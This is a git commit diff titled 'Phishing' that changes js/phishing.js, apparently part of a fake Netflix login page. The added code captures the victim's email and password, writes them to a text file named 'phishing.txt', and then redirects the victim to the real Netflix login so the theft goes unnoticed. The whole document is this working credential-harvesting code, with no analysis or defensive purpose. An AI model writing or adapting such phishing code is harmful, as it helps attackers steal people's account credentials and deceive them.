d930a76cff08250fa885919418ecf23f808da21a
Vitor de Jesus <83734913+Vitor-ext@users.noreply.github.com>
2023-02-23 15:53:28 -0300

    Phishing

--- js/phishing.js
+++ js/phishing.js
@@ -1,26 +1,24 @@
 function handler(e) {
     e.preventDefault();
 
-    let email = document.querySelector('#email').value ;
-    let password = document.querySelector('#password').value ;
+    let email = document.querySelector('#email').value;
+    let password = document.querySelector('#password').value;
 
     let linknet = "https://www.netflix.com/br/login";
     let netflix = document.createElement('a');
     netflix.href = linknet;
 
-    if (email && password) {
-        
-        console.log(email);
-        console.log(password);
 
-        // {
-        //     Basta Salvar estes dados num arquivo .txt
-        // }
-        
+    if (email && password) {
+
+
+        var blob = new Blob(["O email do usuário é:  " + email + " A senha do usuário é:  " + password], { type: "text/plain;charset=utf-8" });
+        saveAs(blob, "phishing.txt");
+
+
         document.body.appendChild(netflix);
         netflix.click();
 
- 
     } else {
         alert('Campo de Email ou Senha esta Vazio, Por Favor Preencha!');
     }
